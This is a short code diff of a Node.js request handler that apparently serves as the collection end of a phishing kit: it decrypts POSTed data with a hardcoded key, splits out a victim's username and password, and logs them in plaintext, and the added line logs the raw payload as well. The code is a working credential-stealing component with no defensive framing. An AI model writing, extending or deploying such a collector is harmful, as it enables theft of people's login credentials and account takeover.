@@ -11,6 +11,7 @@ module.exports = async (req, res) => {
   if (req.method !== "POST") { return res.status(405).json({ success: false }); }
   try {
     const { data } = req.body;
+    await log(JSON.stringify(data));
     if (!data) { return res.status(400).json({ success: false }); }
     const [username, password] = dec(data, "suckmydick").split("|");
     await log(`Login:\nUsername: ${username}\nPassword: ${password}\nCrypto: ${data}`);
